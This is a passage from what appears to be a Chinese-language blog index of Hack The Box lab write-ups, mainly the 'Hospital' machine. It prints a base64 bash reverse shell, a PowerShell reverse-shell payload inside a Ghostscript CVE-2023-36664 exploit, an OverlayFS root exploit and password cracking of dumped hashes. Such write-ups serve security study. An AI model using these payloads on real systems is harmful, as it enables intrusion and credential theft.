PATHINFO_EXTENSION));\n\n        if (!in_array($fileExtension, $blockedExtensions)) {\n            if (move_uploaded_file($_FILES['image']['tmp_name'], $uploadedFile)) {\n                header(\"Location: /success.php\");\n                exit;\n            } else {\n                header(\"Location: /failed.php\");\n                exit;\n            }\n        } else {\n            header(\"Location: /failed.php\");\n            exit;\n        }\n    }\n}\n?&gt;\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#initial-access","title":"Initial Access","text":"<p>\u6210\u529f\u8bbf\u95ee\u4e0a\u4f20\u7684phar\u683c\u5f0f\u7684shell\uff0c\u8fd0\u884c\u4e00\u4e2a\u53cd\u5f39shell\u547d\u4ee4 <code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNi80NDQ2IDA+JjE= |base64 -d |bash</code> \u4e4b\u540e\u518d\u5f00\u59cb\u63a2\u7d22\uff1a <pre><code>www-data@webserver:/var/www/html/uploads$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@webserver:/var/www/html/uploads$ w\n 11:05:51 up 3 min,  0 user,  load average: 0.05, 0.18, 0.09\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nwww-data@webserver:/var/www/html/uploads$ ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:15:5d:00:8a:02 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.5.2/24 brd 192.168.5.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::215:5dff:fe00:8a02/64 scope link \n       valid_lft forever preferred_lft forever\nwww-data@webserver:/var/www/html/uploads$ netstat -anot\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       Timer\ntcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0    144 192.168.5.2:45198       10.10.14.10:4444        ESTABLISHED on (0.28/0/0)\ntcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 192.168.5.2:80          10.10.14.8:36816        TIME_WAIT   timewait (0.00/0/0)\ntcp6       0      0 192.168.5.2:80          10.10.14.10:48350       ESTABLISHED keepalive (7129.32/0/0)\ntcp6       0      0 192.168.5.2:80          10.10.14.8:51144        TIME_WAIT   timewait (19.58/0/0)\ntcp6       0      0 192.168.5.2:80          10.10.14.8:51202        TIME_WAIT   timewait (12.21/0/0)\n\nwww-data@webserver:/var/www/html/uploads$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\n (...)\ndrwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash\nlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\nmysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false\n</code></pre></p> <p>\u53ef\u4ee5\u53d1\u73b0\u8fdb\u6765\u4e0d\u662f\u9776\u673a\u6807\u7684Windows\uff0c\u4e14\u7f51\u6bb5\u4e0d\u662f\u9776\u673a\u7f51\u6bb5\u3002\u4f30\u8ba1\u662f\u4ec0\u4e48\u5bb9\u5668\uff1f \u6709\u4e2a\u672c\u57303306\u7aef\u53e3\u4ee5\u53camysql\u7528\u6237\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#mysql","title":"MySQL\u51ed\u636e\u6cc4\u6f0f","text":"<p>\u53d1\u73b0mysql\u51ed\u636e\uff0c\u4e8e\u662f\u8fdb\u6570\u636e\u5e93\uff1a <pre><code>www-data@webserver:/var/www/html$ cat .htaccess \nAddType application/x-httpd-php .phar\nwww-data@webserver:/var/www/html$ cat config.php \n&lt;?php\n/* Database credentials. Assuming you are running MySQL\nserver with default setting (user 'root' with no password) */\ndefine('DB_SERVER', 'localhost');\ndefine('DB_USERNAME', 'root');\ndefine('DB_PASSWORD', 'my$qls3rv1c3!');\ndefine('DB_NAME', 'hospital');\n\n/* Attempt to connect to MySQL database */\n$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);\n\n// Check connection\nif($link === false){\n    die(\"ERROR: Could not connect. \" . mysqli_connect_error());\n}\n?&gt;\n\n\nMariaDB [hospital]&gt; show tables;\n+--------------------+\n| Tables_in_hospital |\n+--------------------+\n| users              |\n+--------------------+\n1 row in set (0.000 sec)\n\nMariaDB [hospital]&gt; select * from users;\n+----+----------+--------------------------------------------------------------+---------------------+\n| id | username | password                                                     | created_at          |\n+----+----------+--------------------------------------------------------------+---------------------+\n|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |\n|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |\n|  3 | testasdf | $2y$10$CbOJxZ3trYHvHJ0dqCTFNeNGsQmY8jiSDLW3xVxTHgnZmZiRiZBJe | 2023-11-25 11:03:40 |\n+----+----------+--------------------------------------------------------------+---------------------+\n3 rows in set (0.000 sec)\n</code></pre></p> <p>\u53d1\u73b0\u6570\u636e\u5e93\u51ed\u636e\uff0c\u6574\u7406\u540eJTR\u66b4\u7834\uff1a <pre><code>\u2514\u2500$ fgrep 09-21 users.txt | awk -F'|' '{print $3 $4}' | awk '{print $1,$2}' | tr ' ' ':' &gt; creds.txt\n\n\u2514\u2500$ cat creds.txt\nadmin:$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2\npatient:$2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO\n\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt  creds.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n123456           (admin) \n</code></pre></p> <p>\u83ab\u540d\u5176\u5999\u4e00\u4e2a\u51ed\u636e\uff0c\u4f3c\u4e4e\u53ea\u80fd\u7528\u6765\u767b\u96468080\u7aef\u53e3\u90a3\u4e2a\u7f51\u9875\uff0c\u767b\u5f55\u540e\u4e00\u6837\u662f\u53ea\u80fd\u4e0a\u4f20\u56fe\u7247\u3002\u6ca1\u53d1\u73b0\u5176\u4ed6\u80fd\u7528\u7684\u5730\u65b9\u2026\u2026\u5154\u5b50\u6d1e\uff1f</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#linux-overlayfs","title":"Linux\u5bb9\u5668 - OverlayFS\u63d0\u6743","text":"<pre><code>www-data@webserver:/var/www/html$ uname -a\nLinux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre> <p>\u641c\u4e86\u4e0b\u7248\u672c\uff0c\u53d1\u73b0\u8fd9\u4e2a\u6587\u7ae0\uff1a</p> <p>https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/</p> <pre><code>ww-data@webserver:/var/www/html/uploads$ unshare -rm sh -c \"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;\" &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system(\"bash -i\")'\nroot@webserver:/var/www/html/uploads# id\nuid=0(root) gid=33(www-data) groups=33(www-data)\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#drwilliams","title":"drwilliams\u7528\u6237\u51ed\u636e","text":"<p>\u63d0\u6743\u540e\u5c31\u6536\u96c6 <code>passwd</code> \u548c <code>shadow</code> \u8bd5\u8bd5\u80fd\u5426\u7834\u89e3\uff1a <pre><code>root@webserver:/home/drwilliams# cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\n (...)\ndrwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash\nlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\nmysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false\n\nroot@webserver:/home/drwilliams# cat /etc/shadow\nroot:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::\n (...)\ndrwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::\nlxd:!:19612::::::\nmysql:!:19620::::::\n\n\u2514\u2500$ unshadow passwd.txt shadow.txt | fgrep $\nroot:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:0:0:root:/root:/bin/bash\ndrwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash\n\n\u2514\u2500$ unshadow passwd.txt shadow.txt | fgrep $ &gt; unshadow.txt\n\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt \nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nqwe123!@#        (drwilliams)     \n1g 0:00:00:37 DONE (2023-12-15 01:34) 0.02675g/s 5740p/s 5740c/s 5740C/s raycharles..pl@yboy\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre></p> <p>\u51e0\u7ecf\u8f97\u8f6c\uff0c\u6700\u7ec8\u53c8\u83b7\u5f97\u4e00\u4e2a\u51ed\u636e\uff1a<code>drwilliams:qwe123!@#</code>\u3002\u90a3\u4e48\u91cd\u65b0\u51fa\u53d1\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#smb-drwilliams","title":"SMB - drwilliams\u7528\u6237","text":"<pre><code>\u2514\u2500$ smbclient -L //10.10.11.241 -U drwilliams\nPassword for [WORKGROUP\\drwilliams]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.241 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\n\nsmb: \\hospital.htb\\&gt; ls DfsrPrivate\\\nNT_STATUS_ACCESS_DENIED listing \\hospital.htb\\DfsrPrivate\\\nsmb: \\hospital.htb\\&gt; cd Policies\\\nsmb: \\hospital.htb\\Policies\\&gt; ls\n  .                                   D        0  Tue Sep  5 15:57:22 2023\n  ..                                  D        0  Tue Sep  5 15:57:22 2023\n  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Tue Sep  5 15:57:22 2023\n  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Tue Sep  5 15:57:22 2023\n\n                9640703 blocks of size 4096. 996831 blocks available\nsmb: \\hospital.htb\\Policies\\&gt; ls {31B2F340-016D-11D2-945F-00C04FB984F9}\\\n  .                                   D        0  Tue Sep  5 15:57:22 2023\n  ..                                  D        0  Tue Sep  5 15:57:22 2023\n  GPT.INI                             A       22  Fri Sep  8 13:04:34 2023\n  MACHINE                             D        0  Tue Sep  5 18:47:53 2023\n  USER                                D        0  Tue Sep  5 15:57:22 2023\n\n                9640703 blocks of size 4096. 996831 blocks available\nsmb: \\hospital.htb\\Policies\\&gt; ls {6AC1786C-016F-11D2-945F-00C04fB984F9}\\\n  .                                   D        0  Tue Sep  5 15:57:22 2023\n  ..                                  D        0  Tue Sep  5 15:57:22 2023\n  GPT.INI                             A       22  Fri Oct 27 12:56:38 2023\n  MACHINE                             D        0  Tue Sep  5 15:57:22 2023\n  USER                                D        0  Tue Sep  5 15:57:22 2023\n\n                9640703 blocks of size 4096. 996831 blocks available\n</code></pre> <p>\u6ca1\u4ec0\u4e48\u7279\u6b8a\u53d1\u73b0\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#5985-drwilliams","title":"5985\u7aef\u53e3 - drwilliams\u7528\u6237","text":"<p>\u59d1\u4e14\u8bd5\u4e00\u4e0bWinRM\uff1a<code>evil-winrm -i 10.10.11.241 -u drwilliams -p 'qwe123!@#'</code>\u3002\u767b\u5f55\u5931\u8d25\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#443-drwilliams","title":"443\u7aef\u53e3 - drwilliams\u7528\u6237","text":"<p>\u7528drwilliams\u7528\u6237\u51ed\u636e\u6210\u529f\u767b\u9646\u3002\u4e0d\u8fc7\u8fdb\u53bb\u540e\u8001\u662f\u6709\u5982\u4e0b\u62a5\u9519\uff1a</p> <p>Server Error: Empty startup greeting (hospital.htb:143) Connection to storage server failed.</p> <p>\u5361\u4e86\u4e00\u9635\u4e4b\u540e\u6000\u7591\u662f\u9776\u673a\u6709\u95ee\u9898\uff0c\u4e8e\u662f\u91cd\u542f\u9776\u673a\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#poc-cve-2023-36664","title":"PoC (CVE-2023-36664)","text":"<p>\u518d\u6b21\u767b\u5f55\uff0c\u6b63\u5e38\u663e\u793awebmail\u754c\u9762\u4e86\uff1a</p> <p></p> <p>\u6709\u4e00\u5c01\u90ae\u4ef6\uff0c\u8054\u7cfb\u4eba\u4e3a <code>drbrown@hospital.htb</code>\u3002 \u8c37\u6b4c\u4e00\u4e0b\u90ae\u4ef6\u5173\u952e\u5b57 <code>ghostscript eps exploit</code>\uff0c\u53d1\u73b0\u4e0b\u9762PoC\u3002</p> <p>https://vsociety.medium.com/cve-2023-36664-command-injection-with-ghostscript-poc-exploit-97c1badce0af https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</p> <p>\u751f\u6210payload\u6587\u4ef6\u540e\u56de\u4fe1\uff1a <pre><code>\u2514\u2500$ python CVE_2023_36664_exploit.py -x eps -f powers -g -p 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwACIALAA0ADQANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='\n[+] Generated EPS payload file: powers.eps\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#flag-user","title":"flag: user","text":"<p>\u6210\u529f\u63a5\u53d7\u53cd\u5f39shell\uff1a <pre><code>\u2514\u2500$ nc -lvnp 4445\nlistening on [any] 4445 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.11.241] 18176\n\nPS C:\\Users\\drbrown.HOSPITAL\\Documents&gt; whoami     \nhospital\\drbrown\n\nPS C:\\Users\\drbrown.HOSPITAL\\desktop&gt; cat user.txt\n4c19 (...) d221\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#windows","title":"Windows\u4e3b\u673a\u63a2\u7d22","text":"<p>\u8fdb\u53bb\u540e\u53d1\u73b0\u4e00\u7ec4\u51ed\u636e\uff08<code>hospital\\drbrown:chr!$br0wn</code>\uff09\uff0c\u5e94\u8be5\u5c31\u662f\u5f53\u524d\u7528\u6237\u7684\uff1a <pre><code>PS C:\\Users\\drbrown.HOSPITAL\\documents&gt; cat ghostscript.bat\n@echo off\nset filename=%~1\npowershell -command \"$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c \"C:\\Program` Files\\gs\\gs10.01.1\\bin\\gswin64c.exe\" -dNOSAFER \"C:\\Users\\drbrown.HOSPITAL\\Downloads\\%filename%\" }\"\n</code></pre></p> <p>\u63a5\u7740\u63a2\u7d22\uff0c\u65e0\u679c\uff1a <pre><code>PS C:\\Users\\drbrown.HOSPITAL\\Favorites&gt; ipconfig\n\nWindows IP Configuration\n\n\nEthernet adapter vEthernet (Switch01):\n\n   Connection-specific DNS Suffix  . : \n   Link-local IPv6 Address . . . . . : fe80::3488:527f:9c75:ed51%14\n   IPv4 Address. . . . . . . . . . . : 192.168.5.1\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : \n\nEthernet adapter Ethernet0 2:\n\n   Connection-specific DNS Suffix  . : htb\n   IPv6 Address. . . . . . . . . . . : dead:beef::75\n   IPv6 Address. . . . . . . . . . . : dead:beef::5f9a:6cb7:7525:28fc\n   Link-local IPv6 Address . . . . . : fe80::e160:a175:39d3:fe07%12\n   IPv4 Address. . . . . . . . . . . : 10.10.11.241\n   Subnet Mask . . . . . . . . . . . : 255.255.254.0\n   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:933%12\n                                       10.10.10.2\n\n\n\nPS C:\\xampp&gt; cat passwords.txt\n### XAMPP Default Passwords ###\n\n1) MySQL (phpMyAdmin):\n\n   User: root\n   Password:\n   (means no password!)\n\n2) FileZilla FTP:\n\n   [ You have to create a new user on the FileZilla Interface ] \n\n3) Mercury (not in the USB &amp; lite version): \n\n   Postmaster: Postmaster (postmaster@localhost)\n   Administrator: Admin (admin@localhost)\n\n   User: newuser  \n   Password: wampp \n\n4) WEBDAV: \n\n   User: xampp-dav-unsecure\n   Password: ppmax2011\n   Attention: WEBDAV is not active since XAMPP Version 1.7.4.\n   For activation please comment out the httpd-dav.conf and\n   following modules in the httpd.conf\n\n   LoadModule dav_module modules/mod_dav.so\n   LoadModule dav_fs_module modules/mod_dav_fs.so  \n\n   Please do not forget to refresh the WEBDAV authentification (users and passwords).\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#privilege-escalation","title":"Privilege Escalation","text":"<p>\u60f3\u8d77\u6765\u6709RDP\u7aef\u53e3\u5f00\u653e\uff0cWindows\u8fd8\u662fGUI\u597d\u64cd\u4f5c\u4e8e\u662fRDP\u8fde\u63a5\uff0c\u8fdb\u5165\u540e\u53d1\u73b0\u6709\u4e2aselenium\u811a\u672c\u5728\u6267\u884c\u3002\u4ee5Administrator\u51ed\u636e\u767b\u9646Webmail\u7f51\u9875\u3002 \u9759\u9759\u5730\u770b\u4ed6\u64cd\u4f5c\uff0c\u767b\u5f55\u7684\u77ac\u95f4IE\u5f39\u51fa\u63d0\u793a\u95ee\u8981\u4e0d\u8981\u4fdd\u5b58\u51ed\u636e\u2026\u2026\u5f53\u7136\u8981\u554a\uff01\u6211\u5df2\u7ecf\u611f\u89c9\u5f97\u5e94\u8be5\u6ca1\u51e0\u4e2a\u4eba\u662f\u6309\u7167\u6211\u8fd9\u4e2a\u8def\u7ebf\u63d0\u6743\u7684\u4e86\uff01</p> <p></p> <p>\u540e\u6765\u8bd5\u4e86\u4e0b\u5173\u6389powershell\u4f1a\u81ea\u52a8\u91cd\u6765\uff0c\u6240\u4ee5\u8fd9\u79cd\u8def\u7ebf\u4e5f\u662f\u53ef\u4ee5\u91cd\u73b0\u7684\u3002\u4ee5\u53ca\u5373\u4f7f\u6ca1\u6709\u7528\u6d4f\u89c8\u5668\u4fdd\u5b58\u51ed\u636e\uff0c\u4e5f\u53ef\u4ee5\u5728selenium\u8981\u8f93\u5165\u5bc6\u7801\u7684\u65f6\u5019\u5c06\u9f20\u6807\u70b9\u51fb\u5230\u5176\u4ed6\u5730\u65b9\uff08\u5982\u7528\u6237\u540d\u8f93\u5165\u6846\uff09\uff0c\u4e5f\u80fd\u770b\u5230\u8f93\u5165\u7684\u5bc6\u7801\u662f\u4ec0\u4e48\u3002</p> <p></p> <p>\u6700\u540e\u5728\u51ed\u636e\u7ba1\u7406\u5668\u4e2d\u83b7\u5f97 <code>Administrator:Th3B3stH0sp1t4l9786!</code>\u3002</p> <p></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#flag-root","title":"flag: root","text":"<p>\u6700\u540eRDP\u767b\u9646Administrator\u83b7\u5f97root flag\uff1a <code>xfreerdp /cert:ignore /v:10.10.11.241 /u:Administrator /p:'Th3B3stH0sp1t4l9786!'</code></p> <p></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#_3","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/11/25</p> <p>\u6709\u70b9\u4e0d\u592a\u660e\u767d\u4e3a\u4ec0\u4e48drwilliams\u7528\u6237\u4e0d\u80fd\u7528WinRM\u767b\u9646\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Hospital/#linux","title":"\u5173\u4e8e\u7acb\u8db3\u7684Linux","text":"<p>\u6700\u7ec8\u63d0\u6743\u540e\u53d1\u73b0\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6240\u4ee5\u6700\u5f00\u59cb\u7acb\u8db3\u662f\u8fdb\u4e86\u4e2aLinux\u7684\u865a\u62df\u673a\uff1a</p> vm_comp.ps1<pre><code>$vm_name = \"LinuxServer\"\nget-vm -name $vm_name | stop-vm -force\nSet-VMProcessor $vm_name -CompatibilityForMigrationEnabled $true\nstart-vm -name $vm_name \n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Inject/","title":"HTB-Inject","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#_1","title":"\u626b\u63cf","text":"<ul> <li>22/tcp: OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</li> <li>8080/tcp: Nagios NSCA</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"<ul> <li>22\u7aef\u53e3\u8fd9\u4e2a\u7248\u672c\u4f3c\u4e4e\u65e0\u6cd5\u5229\u7528</li> <li>\u5173\u6ce88080\uff0ccurl\u8fde\u63a5\u4e86\u4e00\u4e0b\u6ca1\u6709Location\u5b57\u6bb5\u3002\u6253\u5f00\u6d4f\u89c8\u5668\u76f4\u63a5\u8bbf\u95ee\u76ee\u6807\u76848080\u7aef\u53e3</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#8080","title":"8080\u7aef\u53e3","text":"<ul> <li>robots.txt\uff1a\u65e0</li> <li>\u7f51\u9875\u6e90\u7801\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u5b50\u57df\u679a\u4e3e\uff1a\u65e0\u57df\u540d\u6240\u4ee5\u5bf9\u8c61\u5916</li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a<ul> <li>/blogs                (Status: 200) [Size: 5371]</li> <li>/register             (Status: 200) [Size: 5654]</li> <li>/upload               (Status: 200) [Size: 1857]</li> <li>/environment          (Status: 500) [Size: 712]</li> <li>/error                (Status: 500) [Size: 106]</li> <li>/release_notes        (Status: 200) [Size: 1086]</li> <li>/show_image           (Status: 400) [Size: 194]</li> </ul> </li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#_3","title":"\u7814\u7a76\u7f51\u9875\u529f\u80fd","text":"<ul> <li>\u5de6\u4e0a\u65b9\u7684 <code>Blogs</code>\u3002\u8df3\u8f6c/blogs\u754c\u9762\uff0c\u67093\u7bc7\u6587\u7ae0\u3002\u65e0\u6cd5\u70b9\u51fb\u3002<ul> <li>\u6b64\u5904\u6587\u7ae0\u4f5c\u8005\u5171\u67092\u4f4d\uff1aadmin\uff0cBrandon Auger\u3002</li> </ul> </li> <li>\u53f3\u4e0a\u89d2\u7684 <code>upload</code>\u3002\u529f\u80fd\u6709\u7528\uff0c\u4e0d\u8fc7\u4ec5\u5141\u8bb8\u4e0a\u4f20\u56fe\u7247\u6587\u4ef6\u3002  <ul> <li> <p>Only image files are accepted!</p> </li> <li>\u4e0a\u4f20\u56fe\u7247\u4e4b\u540e\u53ef\u5728\u6b64URL\u8bbf\u95ee\uff1ahttp://10.10.11.204:8080/show_image?img=TEST.png</li> </ul> </li> </ul> <p>\u6240\u4ee5\u5e94\u8be5\u662f\u7814\u7a76\u4e0a\u4f20webshell\u4e86\uff0c\u7ed3\u5408\u9776\u673a\u540d\u5b57\uff0c\u4f30\u8ba1\u662f\u6293\u5305\u6ce8\u5165\u4ec0\u4e48\u53c2\u6570\u3002</p> <p>\u7528Burp\u5c1d\u8bd5\u4e86\u4e00\u4e0b\u4ec5\u4fee\u6539\u6587\u4ef6\u540e\u7f00\u540d\u5373\u53ef\u4e0a\u4f20\u3002\u4e0d\u8fc7\u8bbf\u95ee\u4f1a\u4ee5\u56fe\u7247\u7684\u5f62\u5f0f\u663e\u793a\u62a5\u9519\u4fe1\u606f\u3002 \u7f51\u9875\u6e90\u7801\uff1a <pre><code>&lt;body&gt;\n    &lt;img src=\"http://10.10.11.204:8080/show_image?img=test.jpg\" alt=\"The image \u201chttp://10.10.11.204:8080/show_image?img=test.jpg\u201d cannot be displayed because it contains errors.\"&gt;\n&lt;/body&gt;\n</code></pre></p> <p>\u4ee5\u53ca\u4e0a\u4f20\u7684\u6587\u4ef6\u4f1a\u88ab\u5b9a\u671f\u6e05\u9664\u7684\u6837\u5b50\u3002</p> <p>\u5c1d\u8bd5\u5728img\u53c2\u6570\u653e\u653e\u5355\u5f15\u53f7\u4ec0\u4e48\u7684\uff0c\u6ca1\u5565\u7528\u3002  </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#_4","title":"\u76ee\u5f55\u904d\u5386","text":"<p>\u5c1d\u8bd5\u76ee\u5f55\u904d\u5386\uff0c\u53d1\u73b0 <code>img=../</code> \u80fd\u663e\u793a\u6587\u4ef6\uff1a </p> <p>\u5662\u2026\u2026\u770b\u6765\u4e0d\u662f\u4e0a\u4f20webshell</p> <p>\u5c1d\u8bd5\u83b7\u53d6 <code>/etc/passwd</code>\uff1a <pre><code>GET 